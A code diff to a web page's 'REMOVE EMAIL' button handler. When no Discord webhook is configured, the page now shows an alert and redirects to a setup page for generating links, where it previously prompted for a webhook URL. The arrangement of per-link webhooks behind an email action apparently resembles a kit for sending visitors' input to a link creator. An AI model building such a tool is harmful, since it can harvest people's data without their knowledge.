@@ -1110,22 +1110,18 @@
 
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    const manualWebhook = prompt('Discord webhook not configured. This link appears to be invalid or misconfigured.\n\nIf you have a webhook URL, you can enter it manually below:', '');
+                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.\n\nPlease use the setup page to generate a valid link.');
+                    processBtn.disabled = false;
+                    processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
                     
-                    if (manualWebhook && manualWebhook.trim() && manualWebhook.includes('discord.com/api/webhooks/')) {
-                        webhookUrl = manualWebhook.trim();
-                        console.log('Using manually entered webhook URL');
-                        
-                        // Save for future use
-                        localStorage.setItem('discord_webhook_url', webhookUrl);
-                        
-                        // Continue with the process
-                    } else {
-                        alert('No valid webhook URL provided. Cannot proceed with email removal.');
-                        processBtn.disabled = false;
-                        processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
-                        return;
-                    }
+                    // Redirect to setup page after a short delay
+                    setTimeout(function() {
+                        if (confirm('Would you like to go to the setup page now?')) {
+                            window.location.href = 'setup.html';
+                        }
+                    }, 500);
+                    
+                    return;
                 }
                 
                 // Prepare webhook data
